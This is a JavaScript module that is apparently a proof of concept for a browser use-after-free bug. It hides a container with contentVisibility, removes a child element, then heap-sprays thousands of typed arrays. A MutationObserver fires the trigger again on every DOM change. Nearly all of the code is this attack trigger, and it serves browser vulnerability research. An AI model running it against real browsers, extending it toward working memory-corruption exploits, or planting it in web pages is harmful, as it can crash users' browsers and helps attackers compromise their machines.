import { debug_log } from './module/utils.mjs';

let container = document.querySelector(".container");
let child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  container = document.querySelector(".container");
  child = document.querySelector(".child");
  if (!container) {
    debug_log("No container found.");
    return;
  }
  if (!child) {
    debug_log("No child found, nothing to remove.");
    return;
  }
  container.style.contentVisibility = "hidden";
  child.remove();
  setTimeout(() => {
    container.style.contentVisibility = "auto";
    let spray = heapSpray();
    debug_log("UAF triggered, check for crash or memory corruption.");
  }, 0);
}

export function resetPoC() {
  container = document.querySelector(".container");
  if (!container.querySelector(".child")) {
    let newChild = document.createElement("div");
    newChild.className = "child";
    container.appendChild(newChild);
    debug_log("PoC reset: child re-added.");
  } else {
    debug_log("Child already present, nothing reset.");
  }
}

const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, attempting UAF...");
  triggerUAF();
});

observer.observe(container, { childList: true, subtree: true });
